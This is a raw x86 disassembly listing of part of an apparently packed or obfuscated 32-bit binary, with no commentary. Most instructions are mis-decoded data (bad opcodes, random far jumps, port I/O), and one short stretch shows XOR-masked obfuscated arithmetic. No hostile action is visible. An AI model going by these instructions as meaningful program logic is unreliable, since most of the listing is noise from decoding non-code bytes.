  41eaa1:	shr    DWORD PTR [ebp+0x39],1
  41eaa4:	adc    eax,0x7d8ce4b6
  41eaa9:	pop    esp
  41eaaa:	aas    
  41eaab:	out    0xf4,eax
  41eaad:	jle    0x41ea49
  41eaaf:	mov    ds:0x8ed1db86,al
  41eab4:	mov    esi,DWORD PTR [edi+0x3]
  41eab7:	add    al,BYTE PTR [eax+ebp*8-0x34]
  41eabb:	sub    al,0x2d
  41eabd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41eabe:	arpl   WORD PTR ds:0x47815c8,di
  41eac4:	loopne 0x41eb2e
  41eac6:	mov    eax,0x6c5a7b45
  41eacb:	out    0x25,al
  41eacd:	or     eax,0x770a9f5c
  41ead2:	jns    0x41eb3a
  41ead4:	mov    ebx,DWORD PTR [ebp+0x53]
  41ead7:	ins    DWORD PTR es:[edi],dx
  41ead8:	xchg   DWORD PTR [ebp+0x6ddb45a2],eax
  41eade:	mov    ds:0x34e7bd02,al
  41eae3:	add    ebp,edi
  41eae5:	push   esp
  41eae6:	(bad)  
  41eae7:	pop    eax
  41eae8:	es push edx
  41eaea:	pop    edi
  41eaeb:	inc    ecx
  41eaec:	pop    esp
  41eaed:	add    cl,cl
  41eaef:	push   ebp
  41eaf0:	icebp  
  41eaf1:	pop    edx
  41eaf2:	cmc    
  41eaf3:	jmp    0x41eb0b
  41eaf5:	inc    ebx
  41eaf6:	test   BYTE PTR ds:0xf47f4ba4,ch
  41eafc:	in     al,dx
  41eafd:	inc    edx
  41eafe:	mul    DWORD PTR [ecx+0x53807f3c]
  41eb04:	mov    ds:0xc05629f7,eax
  41eb09:	and    al,0xa8
  41eb0b:	imul   esp,DWORD PTR [ebp+ebx*1+0x6f],0x14d3dbb4
  41eb13:	or     ah,BYTE PTR [esi-0x30]
  41eb16:	mov    dl,BYTE PTR [edx-0x63]
  41eb19:	or     BYTE PTR [edx-0x4883844b],0xad
  41eb20:	mov    al,BYTE PTR [esi+0x1b519c73]
  41eb26:	or     DWORD PTR [ecx+eiz*8],0x1a
  41eb2a:	jnp    0x41eb89
  41eb2c:	mov    DWORD PTR [eax],ebp
  41eb2e:	ret    0xda4d
  41eb31:	daa    
  41eb32:	jecxz  0x41eaf9
  41eb34:	jmp    0x2940:0xd9fcf05
  41eb3b:	in     eax,0xd8
  41eb3d:	ds int3 
  41eb3f:	in     al,dx
  41eb40:	test   DWORD PTR [edi],0x568f0f05
  41eb46:	gs cmp eax,0xbc80510f
  41eb4c:	cdq    
  41eb4d:	mov    ecx,0xac42db4d
  41eb52:	and    al,0xe8
  41eb54:	adc    esi,DWORD PTR [ecx]
  41eb56:	inc    ecx
  41eb57:	enter  0xe71c,0xf2
  41eb5b:	enter  0x3b3c,0xcd
  41eb5f:	mov    bl,0xb6
  41eb61:	aad    0xc1
  41eb63:	inc    ax
  41eb65:	push   0x23
  41eb67:	sbb    al,0xc6
  41eb69:	adc    edx,DWORD PTR [edi]
  41eb6b:	fstp   TBYTE PTR ds:0x16c6b8ed
  41eb71:	cmp    edi,esp
  41eb73:	sub    al,0x43
  41eb75:	xor    ecx,DWORD PTR [eax+edi*8+0x5d7a13f0]
  41eb7c:	cmp    DWORD PTR [ebx],0x26
  41eb7f:	addr16 xchg edi,eax
  41eb81:	or     DWORD PTR [edi+0xd5936d7],ebx
  41eb87:	dec    ebx
  41eb88:	mov    ss,WORD PTR [ecx-0x532783cb]
  41eb8e:	test   bh,dl
  41eb90:	inc    edi
  41eb91:	dec    ebx
  41eb92:	addr16 repnz push esp
  41eb95:	stos   BYTE PTR es:[edi],al
  41eb96:	mov    edx,0x66c16252
  41eb9b:	pop    ebp
  41eb9c:	test   al,dl
  41eb9e:	loopne 0x41eb83
  41eba0:	mov    ebp,0x930f3517
  41eba5:	out    dx,eax
  41eba6:	sbb    al,0xdd
  41eba8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eba9:	ror    DWORD PTR [ebx+esi*8-0x18],0x5b
  41ebae:	jmp    0x41eb79
  41ebb0:	je     0x41eb7a
  41ebb2:	add    eax,0xe66e3123
  41ebb7:	jne    0x41eb3e
  41ebb9:	sbb    DWORD PTR [esi-0x1a558f45],ecx
  41ebbf:	jmp    0x46af:0x1d49b025
  41ebc6:	call   DWORD PTR [esi+ecx*4+0x317fae3e]
  41ebcd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ebce:	mov    cl,0x4c
  41ebd0:	imul   edx,DWORD PTR [eax-0x75301345],0xffffffad
  41ebd7:	scas   eax,DWORD PTR es:[edi]
  41ebd8:	mov    ebx,DWORD PTR [eax]
  41ebda:	fsubr  st(6),st
  41ebdc:	add    BYTE PTR ds:0x48c66de8,bh
  41ebe2:	and    ah,ch
  41ebe4:	sbb    al,0x76
  41ebe6:	sub    eax,eax
  41ebe8:	cmc    
  41ebe9:	push   ebx
  41ebea:	mov    edi,edi
  41ebec:	fstp   DWORD PTR [ebp-0x1d]
  41ebef:	out    0x4b,al
  41ebf1:	mov    bl,0x7c
  41ebf3:	loopne 0x41ebca
  41ebf5:	shr    DWORD PTR [eax+eiz*1],0xd9
  41ebf9:	adc    DWORD PTR [ecx+0x2a660a0e],0xe
  41ec00:	cmp    eax,0xd58c4ad1
  41ec05:	xor    edx,DWORD PTR [esp+eax*2+0x1c]
  41ec09:	xor    al,0x15
  41ec0b:	loopne 0x41ec42
  41ec0d:	out    0xa2,eax
  41ec0f:	sub    esp,DWORD PTR [eax+0x3c206051]
  41ec15:	fcom   DWORD PTR [esp+eiz*2+0x7e]
  41ec19:	outs   dx,BYTE PTR ds:[esi]
  41ec1a:	sub    BYTE PTR [esi-0x6b],ch
  41ec1d:	xchg   esp,ecx
  41ec1f:	fyl2x  
  41ec21:	jle    0x41ebb1
  41ec23:	call   0x8929:0xdc1bc859
  41ec2a:	mov    ebx,DWORD PTR [esi-0x6a]
  41ec2d:	or     bh,BYTE PTR [eax+0x5c4b99a]
  41ec33:	jns    0x41ebf7
  41ec35:	xchg   ecx,eax
  41ec36:	pop    ds
  41ec37:	rcl    DWORD PTR [edx],0xb
  41ec3a:	(bad)  
  41ec3b:	iret   
  41ec3c:	cwde   
  41ec3d:	inc    edi
  41ec3e:	mov    edi,0xc50eb2a6
  41ec43:	ret    
  41ec44:	xor    DWORD PTR [ebp+0x42],0x4
  41ec48:	pusha  
  41ec49:	push   edi
  41ec4a:	mov    cl,0x7b
  41ec4c:	xchg   ebp,eax
  41ec4d:	out    dx,eax
  41ec4e:	nop
  41ec4f:	mov    dl,0xd7
  41ec51:	sub    al,0x85
  41ec53:	retf   
  41ec54:	cmp    eax,0xcf994d5d
  41ec59:	pop    eax
  41ec5a:	mov    dh,0xf8
  41ec5c:	call   0x5777:0x85a690da
  41ec63:	ficomp WORD PTR [edx]
  41ec65:	cdq    
  41ec66:	push   esp
  41ec67:	in     al,dx
  41ec68:	sbb    dl,BYTE PTR [edx-0x10004356]
  41ec6e:	mov    ds:0xdce950ad,al
  41ec73:	cmc    
  41ec74:	inc    ebx
  41ec75:	inc    edx
  41ec76:	mov    eax,ds:0x27931abe
  41ec7b:	in     al,0xda
  41ec7d:	aad    0x92
  41ec7f:	pop    eax
  41ec80:	mov    dl,BYTE PTR [ebx-0x3]
  41ec83:	repz jnp 0x41ec2a
  41ec86:	int3   
  41ec87:	es data16 sbb al,0xa
  41ec8b:	mov    edx,0x58a47a22
  41ec90:	fnstsw WORD PTR [edi+0xd]
  41ec93:	fadd   st(4),st
  41ec95:	shr    DWORD PTR [ecx+0x38d3de3a],0xb7
  41ec9c:	leave  
  41ec9d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ec9e:	cmp    DWORD PTR [esi],esi
  41eca0:	xor    esi,DWORD PTR [ebx+ecx*4]
  41eca3:	lahf   
  41eca4:	and    eax,0xc13d1005
  41eca9:	imul   esi,DWORD PTR [ebp+0xab6f134],0xffffffb1
  41ecb0:	jbe    0x41ec8c
  41ecb2:	fisub  WORD PTR [edi]
  41ecb4:	fidivr DWORD PTR [esi]
  41ecb6:	pop    esp
  41ecb7:	and    edi,edx
  41ecb9:	nop
  41ecba:	hlt    
  41ecbb:	(bad)  
  41ecbc:	or     al,0x64
  41ecbe:	mov    bl,0xfa
  41ecc0:	dec    ecx
  41ecc1:	mov    ch,0x7f
  41ecc3:	outs   dx,BYTE PTR ds:[esi]
  41ecc4:	fwait
  41ecc5:	jns    0x41ed1c
  41ecc7:	xchg   esi,eax
  41ecc8:	sub    al,0xa7
  41ecca:	sub    BYTE PTR [ebx],dh
  41eccc:	lds    ebp,FWORD PTR [ecx+0x34047890]
  41ecd2:	mov    esp,0x219e71e9
  41ecd7:	sbb    ecx,edi
  41ecd9:	int3   
  41ecda:	fimul  DWORD PTR [edi]
  41ecdc:	lods   eax,DWORD PTR ds:[esi]
  41ecdd:	out    dx,eax
  41ecde:	jmp    0x271f78a5
  41ece3:	pop    ebp
  41ece4:	aad    0x53
  41ece6:	or     eax,0x2da3bd2e
  41eceb:	test   al,0x69
  41eced:	(bad)  
  41ecef:	(bad)  
  41ecf0:	pop    DWORD PTR cs:[ebx+ebp*1-0x7637cc32]
  41ecf8:	dec    ebp
  41ecf9:	or     BYTE PTR [ebx+0x558b084d],cl
  41ecff:	or     BYTE PTR [ecx-0x2e],ch
  41ed02:	cmc    
  41ed03:	or     BYTE PTR [edi+0x0],dl
  41ed06:	xor    ecx,eax
  41ed08:	add    ecx,esi
  41ed0a:	lea    ecx,[ebp+ecx*4-0x64]
  41ed0e:	mov    edi,DWORD PTR [ecx]
  41ed10:	add    edx,edi
  41ed12:	mov    DWORD PTR [ecx],edx
  41ed14:	mov    ecx,DWORD PTR [ebp+0x8]
  41ed17:	xor    ecx,eax
  41ed19:	add    ecx,esi
  41ed1b:	jne    0x41c96c
  41ed21:	mov    ecx,DWORD PTR [ebp-0x8]
  41ed24:	mov    edx,DWORD PTR [ebp-0x20]
  41ed27:	xor    ecx,eax
  41ed29:	lea    ecx,[ecx+edx*1+0x3272db]
  41ed30:	mov    DWORD PTR [ebp-0x20],ecx
  41ed33:	inc    DWORD PTR [ebp+0xc]
  41ed36:	mov    ecx,DWORD PTR [ebp-0x1c]
  41ed39:	xor    ecx,eax
  41ed3b:	add    ecx,esi
  41ed3d:	jne    0x41c71d
  41ed43:	jmp    0x421147
  41ed48:	mov    ecx,DWORD PTR [ebp-0xc]
  41ed4b:	mov    DWORD PTR [ebp+0x8],ecx
  41ed4e:	jmp    0x41ed80
  41ed53:	mov    ecx,DWORD PTR [ebp+0x8]
  41ed56:	mov    edx,DWORD PTR [ebp-0x8]
  41ed59:	xor    ecx,eax
  41ed5b:	xor    edx,eax
  41ed5d:	sub    ecx,edx
  41ed5f:	sub    ecx,esi
  41ed61:	xor    ecx,eax
  41ed63:	mov    DWORD PTR [ebp+0x8],ecx
  41ed66:	mov    ecx,DWORD PTR [ebp+0x8]
  41ed69:	mov    edx,DWORD PTR [ebp+0x8]
  41ed6c:	imul   edx,edx,0x5708f5
  41ed72:	xor    ecx,eax
  41ed74:	add    ecx,esi
  41ed76:	lea    ecx,[ebp+ecx*4-0x64]
  41ed7a:	mov    edi,DWORD PTR [ecx]
  41ed7c:	add    edx,edi
  41ed7e:	mov    DWORD PTR [ecx],edx
  41ed80:	mov    ecx,DWORD PTR [ebp+0x8]
  41ed83:	xor    ecx,eax
  41ed85:	add    ecx,esi
  41ed87:	jne    0x41ed53
  41ed8d:	jmp    0x421153
  41ed92:	mov    ecx,DWORD PTR [ebp+0x8]
  41ed95:	mov    edx,DWORD PTR [ebp-0x8]
  41ed98:	xor    ecx,eax
  41ed9a:	xor    edx,eax
  41ed9c:	sub    ecx,edx
  41ed9e:	sub    ecx,esi
  41eda0:	xor    ecx,eax
  41eda2:	mov    DWORD PTR [ebp+0x8],ecx
  41eda5:	mov    ecx,DWORD PTR [ebp+0x8]
  41eda8:	mov    edx,DWORD PTR [ebp+0x8]
  41edab:	xor    ecx,eax
  41edad:	imul   edx,edx,0x5708f5
  41edb3:	add    ecx,esi
  41edb5:	lea    ecx,[ebp+ecx*4-0x64]
  41edb9:	jmp    0x421134
  41edbe:	dec    ecx
  41edbf:	xor    eax,0xa7642764
  41edc4:	test   DWORD PTR [ebx],edx
  41edc6:	mov    esi,0xb5e70850
  41edcb:	xchg   edi,eax
  41edcc:	pop    ebp
  41edcd:	int3   
  41edce:	sbb    edx,0x61
  41edd1:	bound  eax,QWORD PTR [edi+ebx*2]
  41edd4:	bound  esp,QWORD PTR [edx+0x75]
  41edd7:	xchg   BYTE PTR [esi],al
  41edd9:	pop    ebx
  41edda:	(bad)  
  41eddb:	aaa    
  41eddc:	pop    ebx
  41eddd:	shl    DWORD PTR [edi-0x64479850],1
  41ede3:	push   esp
  41ede4:	das    
  41ede5:	adc    eax,0xbcf23a78
  41edea:	ret    0xce54
  41eded:	lods   eax,DWORD PTR ds:[esi]
  41edee:	adc    esp,esp
  41edf0:	lahf   
  41edf1:	and    dh,BYTE PTR [esi]
  41edf3:	xchg   BYTE PTR [ebx-0x36c007f],bl
  41edf9:	fwait
  41edfa:	mov    ds:0xce35c7c8,al
  41edff:	inc    esi
  41ee00:	(bad)  
  41ee01:	push   es
  41ee02:	xchg   edi,eax
  41ee03:	cld    
  41ee04:	loop   0x41eda2
  41ee06:	out    0xb9,al
  41ee08:	pushf  
  41ee09:	or     al,0x9b
  41ee0b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ee0c:	jnp    0x41edb0
  41ee0e:	imul   DWORD PTR [ebx+ebx*2+0x5fdffd1c]
  41ee15:	jmp    0x1fdc:0x156f2c7c
  41ee1c:	jl     0x41ee00
  41ee1e:	sub    eax,0x4da2c295
  41ee23:	ficom  WORD PTR [ebp+0x20a8560]
  41ee29:	cs in  al,dx
  41ee2b:	and    DWORD PTR [edx+0x1e],edx
  41ee2e:	test   BYTE PTR [eax-0x60],dl
  41ee31:	imul   eax,DWORD PTR [ecx+ebx*2+0x6761693a],0xffffff89
  41ee39:	pop    eax
  41ee3a:	xchg   ecx,eax
  41ee3b:	jns    0x41ee47
  41ee3d:	fdivr  QWORD PTR [esi+0x40c03947]
  41ee43:	adc    DWORD PTR [esi-0x543da40],edx
  41ee49:	mov    edx,ecx
  41ee4b:	sub    BYTE PTR [eax-0x20805c1],dh
  41ee51:	outs   dx,DWORD PTR ds:[esi]
  41ee52:	xchg   DWORD PTR [ebx+edx*2],esi
  41ee55:	lds    edx,FWORD PTR [edi-0x3cdd26d]
  41ee5b:	popa   
  41ee5c:	dec    eax
  41ee5d:	ins    DWORD PTR es:[edi],dx
  41ee5e:	(bad)  
  41ee5f:	jmp    0xe73a:0x84f19e40
  41ee66:	mov    edx,gs
  41ee68:	jae    0x41eec4
  41ee6a:	pop    edi
  41ee6b:	mov    al,0xcf
  41ee6d:	adc    BYTE PTR [edx-0x162d427a],cl
  41ee73:	mov    edi,0x1549841a
  41ee78:	psllq  mm4,QWORD PTR [eax]
  41ee7b:	xor    al,0xc6
  41ee7d:	aam    0xc4
  41ee7f:	jb     0x41ee70
  41ee81:	mov    dh,0xdf
  41ee83:	fnstcw WORD PTR [esi]
  41ee85:	test   BYTE PTR [ebx+0x2e],cl
  41ee88:	inc    ebp
  41ee89:	inc    esp
  41ee8a:	push   0x7cea3fac
  41ee8f:	fnstsw WORD PTR [ecx-0x31]
  41ee92:	popf   
  41ee93:	cdq    
  41ee94:	pop    ecx
  41ee95:	cli    
  41ee96:	fcmovu st,st(0)
  41ee98:	test   dh,cl
  41ee9a:	int    0xd9
  41ee9c:	ror    ch,0x6
  41ee9f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eea0:	xchg   esp,eax
  41eea1:	ror    DWORD PTR [eax+0x47],0x87
  41eea5:	icebp  
  41eea6:	and    eax,DWORD PTR [ecx-0x6110150b]
  41eeac:	dec    ebx
  41eead:	aad    0xd1
  41eeaf:	push   ebx
  41eeb0:	push   esi
  41eeb1:	mov    ah,dl
  41eeb3:	or     al,bl
  41eeb5:	xchg   DWORD PTR [edi],esi
  41eeb7:	fldcw  WORD PTR [ebx]
  41eeb9:	add    BYTE PTR [edx+0x3d721445],dl
  41eebf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41eec0:	(bad)  
  41eec1:	ds xchg ebx,eax
  41eec3:	mov    ebx,0x5bdadba0
  41eec8:	int3   
  41eec9:	test   eax,0xa39b1e34
  41eece:	and    bl,BYTE PTR [edx]
  41eed0:	adc    BYTE PTR [edx+0x7555ebae],al
  41eed6:	jmp    0x98f8:0x127437ef
  41eedd:	cmp    eax,DWORD PTR [di-0x5e61]
  41eee2:	mov    ebp,0x93941540
  41eee7:	xor    BYTE PTR [esi-0x79],ah
  41eeea:	cs out 0xc,al
  41eeed:	out    0xe8,al
  41eeef:	sti    
  41eef0:	or     esi,DWORD PTR [esi-0x5189b3ff]
  41eef6:	popf   
  41eef7:	and    bl,ch
  41eef9:	mov    bh,0x7b
  41eefb:	pop    eax
  41eefc:	aas    
  41eefd:	push   ecx
  41eefe:	icebp  
  41eeff:	add    BYTE PTR [ebx-0x48],al
  41ef02:	mov    ds:0xc63e8f19,eax
  41ef07:	iret   
  41ef08:	dec    ecx
  41ef09:	(bad)  
  41ef0a:	jmp    0x41eed4
  41ef0c:	aas    
  41ef0d:	mov    al,ds:0xf9cb019
  41ef12:	fmul   DWORD PTR [ecx+0x21408f37]
  41ef18:	xor    DWORD PTR [edi],ebp
  41ef1a:	into   
  41ef1b:	xor    DWORD PTR [edx+0x49],esp
  41ef1e:	xor    eax,0xac8957ec
  41ef23:	retf   
  41ef24:	mov    esp,0x2dae212f
  41ef29:	ins    DWORD PTR es:[edi],dx
  41ef2a:	cld    
  41ef2b:	adc    BYTE PTR ss:[ebp+0x3ba6d548],al
  41ef32:	push   0xdff87625
  41ef37:	into   
  41ef38:	pop    ecx
  41ef39:	repz cld 
  41ef3b:	retf   0xeee7
  41ef3e:	mov    dh,0x23
  41ef40:	cmp    al,0xfc
  41ef42:	in     al,0xda
  41ef44:	cmc    
  41ef45:	(bad)  
  41ef46:	add    al,0x61
  41ef48:	std    
  41ef49:	mov    al,ds:0xe82ce8a7
  41ef4e:	mov    al,ds:0xb1a598ea
  41ef53:	sahf   
  41ef54:	inc    esp
  41ef55:	dec    esp
  41ef56:	mov    ebx,0x334ce37a
  41ef5b:	adc    al,0x35
  41ef5d:	idiv   BYTE PTR [ebx-0x73e03673]
  41ef63:	cs pop edx
  41ef65:	daa    
  41ef66:	xor    al,BYTE PTR [ebx]
  41ef68:	jg     0x41ef90
  41ef6a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ef6b:	into   
  41ef6c:	gs cmp eax,0x51ba5f3c
  41ef72:	arpl   WORD PTR [edi],ax
  41ef74:	push   eax
  41ef75:	daa    
  41ef76:	rep lods al,BYTE PTR ds:[esi]
  41ef78:	inc    esp
  41ef79:	mov    al,ds:0x1167c05b
  41ef7e:	sbb    al,0x80
  41ef80:	js     0x41ef17
  41ef82:	or     ecx,DWORD PTR [eax+eax*4+0x2b]
  41ef86:	and    esi,DWORD PTR [ebp-0x5e]
  41ef89:	loop   0x41ef0b
  41ef8b:	out    dx,eax
  41ef8c:	hlt    
  41ef8d:	out    dx,al
  41ef8e:	(bad)  
  41ef8f:	mov    eax,0x866c891f
  41ef94:	mov    esi,0x467fac
  41ef99:	lods   eax,DWORD PTR ds:[esi]
  41ef9a:	add    ah,BYTE PTR [edi]
  41ef9c:	jmp    DWORD PTR [ebx+eiz*4+0x66]
  41efa0:	jle    0x41ef7e
  41efa2:	cmp    eax,0xc3bea59c
  41efa7:	mov    ebx,0x8ceab1f4
  41efac:	int    0x60
  41efae:	inc    eax
  41efaf:	mov    al,ds:0x917bbc31
  41efb4:	jno    0x41eff2
  41efb6:	int    0xad
  41efb8:	mov    edi,0x57f0ea0b
  41efbd:	icebp  
  41efbe:	clc    
  41efbf:	xchg   esp,eax
  41efc0:	js     0x41efd2
  41efc2:	jo     0x41efa0
  41efc4:	in     eax,dx
  41efc5:	fiadd  DWORD PTR [ebx+edx*4+0x63]
  41efc9:	repz mov esi,0xe231d4dc
  41efcf:	dec    eax
  41efd0:	retf   0x71f4
  41efd3:	add    BYTE PTR [esi],dh
  41efd5:	unpckhps xmm0,XMMWORD PTR [esi+0x64ef9548]
  41efdc:	lock mov al,ds:0x74e1bbfc
  41efe2:	cmc    
  41efe3:	xchg   ebx,eax
  41efe4:	push   DWORD PTR [ebx]
  41efe6:	idiv   BYTE PTR [ebx+ebp*1]
  41efe9:	shl    DWORD PTR [ebp-0x74],0x36
  41efed:	aad    0x7e
  41efef:	mov    esi,0x952cbeb
  41eff4:	iret   
  41eff5:	add    al,0x8d
  41eff7:	add    DWORD PTR [ebp-0x33],ebp
  41effa:	cmp    esi,ebp
  41effc:	test   DWORD PTR [eax-0x5f],0xc3d9dc68
  41f003:	dec    edx
  41f004:	in     eax,dx
  41f005:	and    eax,0xf5cf359a
  41f00a:	clc    
  41f00b:	call   0x71814fcc
  41f010:	pop    esi
  41f011:	mov    esi,0xc5b1f362
  41f016:	je     0x41efe6
  41f018:	(bad)  
  41f019:	jo     0x41f023
  41f01b:	in     al,0x36
  41f01d:	dec    edx
  41f01e:	lea    esp,[edx-0xdc54896]
  41f024:	mov    al,BYTE PTR [ebx]
  41f026:	pop    edi
  41f027:	sub    BYTE PTR [ecx+0x62],0xaa
  41f02b:	jle    0x41f089
  41f02d:	aas    
  41f02e:	cmp    dl,bh
  41f030:	or     BYTE PTR [ecx+0x43],al
  41f033:	(bad)  
  41f034:	sbb    al,BYTE PTR [ebp+0x38]
  41f037:	inc    edx
  41f038:	mov    bl,0xbb
  41f03a:	xor    eax,0x6dee50b
  41f03f:	(bad)  
  41f040:	fcom   DWORD PTR [edx+0x4f]
  41f043:	(bad)  
  41f044:	xchg   ebp,eax
  41f045:	imul   ecx,DWORD PTR [edi+edx*2-0x78],0xffffffb5
  41f04a:	test   DWORD PTR [ebx],0x34326f97
  41f050:	test   al,0x68
  41f052:	mov    ebp,0xec98ad8f
  41f057:	adc    DWORD PTR [esi-0x13],0xe
  41f05b:	mov    al,BYTE PTR ds:0x23db47fe
  41f061:	jmp    0x1d44:0xbcad01de
  41f068:	push   ds
  41f069:	push   ecx
  41f06a:	inc    esi
  41f06b:	in     al,0x3
  41f06d:	xor    bl,BYTE PTR [edi]
  41f06f:	mov    esp,0xcfd4cd11
  41f074:	add    eax,0xf893103d
  41f079:	cmp    DWORD PTR [edi],ecx
  41f07b:	daa    
  41f07c:	jmp    0xfbb8:0x584bd8ed
  41f083:	or     DWORD PTR [ebp-0x35264274],ebx
  41f089:	(bad)  
  41f08a:	pushf  
  41f08b:	lahf   
  41f08c:	or     eax,0x3cbfb485
  41f091:	stos   BYTE PTR es:[edi],al
  41f092:	aam    0x50
  41f094:	in     al,0xa4
  41f096:	and    al,dl
  41f098:	or     eax,0x1af03270
  41f09d:	mov    cl,0x50
  41f09f:	fcmovnbe st,st(3)
  41f0a1:	mov    eax,ds:0xf11f8dcb
  41f0a6:	and    al,0x54
  41f0a8:	cmp    al,0x2e
  41f0aa:	dec    ebx
  41f0ab:	dec    eax
  41f0ac:	xchg   ebx,eax
  41f0ad:	fistp  WORD PTR [esi]
  41f0af:	je     0x41f06b
  41f0b1:	dec    edx
  41f0b2:	or     eax,0x6d131f87
  41f0b7:	aaa    
  41f0b8:	pminsw mm3,QWORD PTR ds:0x58ecb15
  41f0bf:	mov    ds:0x54911993,al
  41f0c4:	lahf   
  41f0c5:	loope  0x41f0e1
  41f0c7:	shr    BYTE PTR [ebp-0x47],0x7d
  41f0cb:	push   esp
  41f0cc:	sbb    ebp,DWORD PTR [edi]
  41f0ce:	xchg   BYTE PTR [ecx],ah
  41f0d0:	dec    esi
  41f0d1:	cli    
  41f0d2:	outs   dx,BYTE PTR ds:[esi]
  41f0d3:	inc    esi
  41f0d4:	dec    esp
  41f0d5:	adc    cl,BYTE PTR [edx-0x1877f2b3]
  41f0db:	and    bh,bl
  41f0dd:	add    al,0x3d
  41f0df:	fst    QWORD PTR [ecx-0xeda35c2]
  41f0e5:	dec    ebp
  41f0e6:	fs push 0xa1419a89
  41f0ec:	pop    esp
  41f0ed:	adc    al,0x14
  41f0ef:	jecxz  0x41f09a
  41f0f1:	retf   0x7391
  41f0f4:	push   es
  41f0f5:	pop    esp
  41f0f6:	ret    
  41f0f7:	(bad)  
  41f0f8:	ficom  WORD PTR [ebx]
  41f0fa:	pop    esp
  41f0fb:	xchg   esp,eax
  41f0fc:	push   es
  41f0fd:	fs punpckhbw mm0,mm5
  41f101:	xor    DWORD PTR [eax+0x6e],esi
  41f104:	lahf   
  41f105:	pop    eax
  41f106:	das    
  41f107:	je     0x41f182
  41f109:	fdiv   QWORD PTR [ebx-0x67]
  41f10c:	xchg   ecx,eax
  41f10d:	es retf 
  41f10f:	out    dx,al
  41f110:	mov    eax,0x65083c07
  41f115:	sub    dh,BYTE PTR [edi+0x26]
  41f118:	sub    esp,DWORD PTR [ebx+0x1f]
  41f11b:	push   edx
  41f11c:	or     esi,ecx
  41f11e:	(bad)  
  41f120:	fsub   DWORD PTR [eax]
  41f122:	dec    ebp
  41f123:	cwde   
  41f124:	fild   WORD PTR [eax+edx*8+0x25]
  41f128:	out    0x6a,al
  41f12a:	scas   al,BYTE PTR es:[edi]
  41f12b:	adc    BYTE PTR [ebp-0x5c],bl
  41f12e:	dec    edi
  41f12f:	push   esp
  41f130:	and    al,BYTE PTR [ebx]
  41f132:	aad    0x25
  41f134:	in     eax,0x6
  41f136:	sti    
  41f137:	cli    
  41f138:	into   
  41f139:	lea    ebp,[ebx]
  41f13b:	inc    eax
  41f13c:	pop    esp
  41f13d:	dec    edx
  41f13e:	mov    esp,0x4130a531
  41f143:	xchg   eax,edx
  41f145:	inc    ebx
  41f146:	js     0x41f179
  41f148:	(bad)  
  41f149:	mov    dh,0x1f
  41f14b:	fwait
  41f14c:	mov    esp,0x357300bc
  41f151:	stc    
  41f152:	mov    al,ds:0xdcfa8a91
  41f157:	cmp    al,0x2b
  41f159:	aas    
  41f15a:	into   
  41f15b:	dec    edx
  41f15c:	ror    BYTE PTR [ebp-0x5be50927],1
  41f162:	lods   al,BYTE PTR ds:[esi]
  41f163:	test   eax,0x3c5c72ba
  41f168:	mov    al,BYTE PTR [edi-0x6f]
  41f16b:	stc    
  41f16c:	mov    cl,BYTE PTR ds:0x698b6596
  41f172:	sub    eax,0x161aca7b
  41f177:	cmc    
  41f178:	sub    DWORD PTR [edi+0x74],ebx
  41f17b:	call   0xf2d7eea
  41f180:	sbb    eax,0xd2ebe992
  41f185:	and    ah,BYTE PTR [edi-0x758d0bab]
  41f18b:	mov    ds,WORD PTR [esi+0x3bdc4d69]
  41f191:	cdq    
  41f192:	icebp  
  41f193:	syscall 
  41f195:	add    ecx,DWORD PTR [esi+0x71509999]
  41f19b:	retf   
  41f19c:	fnstcw WORD PTR [ebp-0xa95123e]
  41f1a2:	fcomip st,st(4)
  41f1a4:	sub    al,bl
  41f1a6:	lahf   
  41f1a7:	mov    dl,0x3
  41f1a9:	or     esi,DWORD PTR [ecx]
  41f1ab:	and    eax,0x7af17f81
  41f1b0:	push   ebx
  41f1b1:	in     al,0x42
  41f1b3:	sub    BYTE PTR [esi],ah
  41f1b5:	stos   DWORD PTR es:[edi],eax
  41f1b6:	push   esp
  41f1b7:	inc    eax
  41f1b8:	push   ecx
  41f1b9:	and    bl,dh
  41f1bb:	pop    edi
  41f1bc:	outs   dx,BYTE PTR ds:[esi]
  41f1bd:	(bad)  
  41f1be:	fld    TBYTE PTR [ebp+0x69fab700]
  41f1c4:	mov    cl,0x69
  41f1c6:	or     ah,0x29
  41f1c9:	sar    DWORD PTR [ecx+ebp*2],1
  41f1cc:	sub    al,0xff
  41f1ce:	jle    0x41f18e
  41f1d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f1d1:	adc    DWORD PTR [esi-0x67ac980e],esp
  41f1d7:	push   eax
  41f1d8:	sub    BYTE PTR [esp-0x2932057b],ah
  41f1df:	and    DWORD PTR [ebx-0x5d7f7cfe],ebp
  41f1e5:	sahf   
  41f1e6:	add    dl,BYTE PTR [ebp-0x64]
  41f1e9:	out    0xe8,al
  41f1eb:	mov    bh,0xc8
  41f1ed:	mov    bh,0x80
  41f1ef:	out    dx,al
  41f1f0:	sbb    eax,0xa8f3db1c
  41f1f5:	les    ecx,FWORD PTR [ecx+0x17dd10fa]
  41f1fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f1fc:	fbstp  TBYTE PTR [esi+0xf]
  41f1ff:	jle    0x41f1c2
  41f201:	sub    ebp,0xf3cd341a
  41f207:	mov    bh,0x78
  41f209:	repnz cli 
  41f20b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f20c:	inc    ecx
  41f20d:	xor    eax,0x2dcdb63e
  41f212:	sub    al,0x9e
  41f214:	cdq    
  41f215:	(bad)  
  41f217:	shl    DWORD PTR [ebx],cl
  41f219:	inc    ebp
  41f21a:	lods   al,BYTE PTR ds:[esi]
  41f21b:	rcr    DWORD PTR [ebx],0x41
  41f21e:	add    DWORD PTR [ecx],esi
  41f220:	push   es
  41f221:	adc    ah,BYTE PTR [ecx+0x25]
  41f224:	add    BYTE PTR [edi+edx*1],0xe9
  41f228:	dec    DWORD PTR [edx+0x79]
  41f22b:	stos   DWORD PTR es:[edi],eax
  41f22c:	ja     0x41f28a
  41f22e:	mov    bh,0x7c
  41f230:	xor    eax,0xb1e688de
  41f235:	dec    eax
  41f236:	sbb    eax,0xa1e7bdff
